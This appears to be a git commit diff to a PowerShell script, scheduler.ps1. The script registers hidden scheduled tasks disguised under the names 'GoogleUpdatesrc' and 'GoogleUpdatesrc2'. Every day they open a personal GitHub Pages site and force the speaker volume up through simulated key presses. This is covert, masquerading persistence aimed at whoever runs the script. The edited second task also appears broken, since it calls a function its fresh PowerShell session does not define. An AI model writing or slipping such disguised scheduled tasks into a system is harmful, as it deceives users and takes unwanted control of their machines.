d300b620875e2428a95458aad2965e98c676cd7f
luigit12 <58264257+Luigit12@users.noreply.github.com>
2021-06-07 11:29:50 +0200

    Update scheduler.ps1

--- scheduler.ps1
+++ scheduler.ps1
@@ -1,7 +1,7 @@
 
-Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..50 | % {$wshShell.SendKeys([char]175)}}
+Function setspeaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..50 | % {$wshShell.SendKeys([char]175)}}
 
-Set-Alias Do-ActualThing Set-Speaker
+Set-Alias Set-Speaker setspeaker
 
 $settings = New-ScheduledTaskSettingsSet -Hidden
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Start-Process https://Luigit12.github.io"
@@ -9,6 +9,6 @@ $trigger = New-ScheduledTaskTrigger -Daily -At 11:00
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'GoogleUpdatesrc' -Settings $settings
 
 $settings2 = New-ScheduledTaskSettingsSet -Hidden
-$action2 = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}; Set-Speaker -Volume 50"
-$trigger2 = New-ScheduledTaskTrigger -Daily -At 11:00
+$action2 = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Set-Speaker"
+$trigger2 = New-ScheduledTaskTrigger -Daily -At 10:59
 Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName 'GoogleUpdatesrc2' -Settings $settings2
